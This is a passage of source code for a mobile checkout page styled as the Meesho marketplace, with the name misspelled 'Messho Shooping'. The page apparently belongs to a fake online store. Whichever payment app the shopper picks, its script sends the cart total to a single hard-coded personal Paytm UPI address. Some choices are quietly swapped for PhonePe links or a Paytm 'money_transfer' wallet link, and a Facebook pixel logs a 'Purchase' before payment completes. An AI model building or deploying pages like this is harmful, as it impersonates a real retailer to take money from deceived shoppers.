...
<style>
    ...
    *::after {
    ...
    .radio-wrap.selected .radio-inner {
        display: block;
    }
...
<div class="step-bar">
    ...
    <div class="step done">
        ...
        <span class="step-lbl">Address</span>
    </div>
    ...
    <div class="step">
        ...
        <span class="step-lbl">Summary</span>
    </div>
</div>
...
<div class="section-card">
    <div class="section-title">PAY ONLINE</div>
    ...
    <!-- G Pay -->
    <div class="method-row" onclick="selectMethod('gpay')">
        <div class="method-left">
            <div class="radio-wrap selected" id="radio-gpay">
                <div class="radio-inner"></div>
            </div>
            <span class="method-name">G Pay</span>
        </div>
        <img class="method-icon"
            src="https://cdn.shopify.com/s/files/1/0987/4102/7106/files/Untitled_design_7.png?v=1770983193" alt="G Pay">
    </div>

    <!-- PhonePe -->
    <div class="method-row" onclick="selectMethod('phonepe')">
        <div class="method-left">
            <div class="radio-wrap" id="radio-phonepe">
                <div class="radio-inner"></div>
            </div>
            <span class="method-name">PhonePe</span>
        </div>
        <img class="method-icon"
            src="https://cdn.shopify.com/s/files/1/0988/1590/1975/files/Untitled_design_10.png?v=1771233121"
            alt="PhonePe">
    </div>

    <!-- Paytm -->
    <div class="method-row" onclick="selectMethod('paytm')">
        <div class="method-left">
            <div class="radio-wrap" id="radio-paytm">
                <div class="radio-inner"></div>
            </div>
            <span class="method-name">Paytm</span>
        </div>
        <img class="method-icon"
            src="https://cdn.shopify.com/s/files/1/0988/1590/1975/files/Untitled_design_8.png?v=1771233121" alt="Paytm">
    </div>

    <!-- BHIM UPI -->
    <div class="method-row" onclick="selectMethod('bhim')">
        <div class="method-left">
            <div class="radio-wrap" id="radio-bhim">
                <div class="radio-inner"></div>
            </div>
            <span class="method-name">BHIM UPI</span>
        </div>
        <img class="method-icon"
            src="https://cdn.shopify.com/s/files/1/0987/4102/7106/files/Untitled_design_6.png?v=1770983191"
            alt="BHIM UPI">
    </div>

    <!-- WhatsApp Pay -->
    <div class="method-row" onclick="selectMethod('whatsapp')">
        <div class="method-left">
            <div class="radio-wrap" id="radio-whatsapp">
                <div class="radio-inner"></div>
            </div>
            <span class="method-name">WhatsApp Pay</span>
        </div>
        <img class="method-icon"
            src="https://cdn.shopify.com/s/files/1/0988/1590/1975/files/Untitled_design_9.png?v=1771233121"
            alt="WhatsApp Pay">
    </div>
</div>
...
<div class="price-card">
    <div class="price-row">
        <span class="lbl">Total Product Price:</span>
        <span class="val" id="subtotalVal">₹0.00</span>
    </div>
    <div class="price-divider"></div>
    <div class="price-row">
        <span class="lbl">Shipping:</span>
        <span class="free" id="shippingVal">FREE</span>
    </div>
    <div class="price-divider"></div>
...
<div class="sticky-footer">
    <div>
        <div class="footer-amount" id="footerTotal">₹0.00</div>
        <div class="footer-detail">VIEW PRICE DETAILS</div>
    </div>
    <button class="pay-btn" onclick="handlePay()">PayNow</button>
</div>
...
<script>
    /* ── Config ── */
  const UPI_ADDRESS = 'paytm.s2u1wzx@pty';
    const PAYEE_NAME  = 'Messho Shooping';
    const tr          = "T23hV9vusth31Wqrv2"
    ...
    function selectMethod(id) {
        document.querySelectorAll('.radio-wrap').forEach(el => el.classList.remove('selected'));
        document.getElementById('radio-' + id).classList.add('selected');
        selectedMethod = id;
    }

    /* ── Render amounts from localStorage (real cart total + shipping selected on cart page) ── */
    function renderAmounts() {
        const cart = JSON.parse(localStorage.getItem('cart') || '[]');
        const subtotal = cart.reduce((s, i) => s + i.price * i.quantity, 0);
        const deliveryMode = localStorage.getItem('deliveryMode') || 'std';
        const shipping = deliveryMode === 'fast' ? 49 : 0;
        ...
        document.getElementById('shippingVal').textContent = shipping === 0 ? 'FREE' : fmt(shipping);
        document.getElementById('totalVal').textContent    = fmt(finalTotal);
        document.getElementById('footerTotal').textContent = fmt(finalTotal);
    }
    ...
    function handlePay() {
        ...
        if (typeof fbq === 'function') {
            fbq('track', 'Purchase', { value: finalTotal, currency: 'INR' });
        }

        // DYNAMIC price from cart (subtotal + shipping) — NOT hardcoded
        const price = finalTotal.toFixed(2);
        const pa = UPI_ADDRESS;
        const pn = PAYEE_NAME;
        let url = '';
        
        function generatePhonePeLink({
            amount,      // Amount in paise (e.g. 63000 = ₹630)
            merchantName,
            vpa,
            note = "Payment"
        }) {
        ...
        switch (selectedMethod) {
            <?php if ($os === 'android'): ?>
            case 'gpay':
                url = generatePhonePeLink({ amount: Math.round(price * 100), merchantName: "Meesho Shooping", vpa: pa, note: pn });
                //url = `tez://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
                break;
            case 'phonepe':
                url = generatePhonePeLink({ amount: Math.round(price * 100), merchantName: "Meesho Shooping", vpa: pa, note: pn });
                //url = `phonepe://pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
                break;
                
                
            <?php elseif ($os === 'ios'): ?>
            case 'gpay':
                url = `phonepe:upi://pay?pa=${pa}&pn=Meesho&am=${price}&cu=INR&tn=Meesho Shopping`;
                //url = `tez://upi/pay?pa=${pa}&pn=${pn}&am=${price}&tr=${tr}&mc=8931&orgid=000000&mode=01&cu=INR&tn=${pn}+OrderId`;
                break;
            case 'phonepe':
                url = `phonepe:upi://pay?pa=${pa}&pn=Meesho&am=${price}&cu=INR&tn=Meesho Shopping`;
            ...
            case 'paytm':
                url = `paytmmp://cash_wallet?pa=${pa}&pn=Meesho%20Shooping&am=${price}&cu=INR&tn=${pn}&featuretype=money_transfer&tr=${tr}`;
                break;
            case 'bhim':
            case 'whatsapp':
            default:
            <?php if ($os === 'android'): ?>
                url = generatePhonePeLink({ amount: Math.round(price * 100), merchantName: "Meesho Shooping", vpa: pa, note: pn });
            <?php elseif ($os === 'ios'): ?>
                url = `phonepe:upi://pay?pa=${pa}&pn=Meesho&am=${amount}&cu=INR&tn=Meesho Shopping`;
            <?php endif ?>
        }
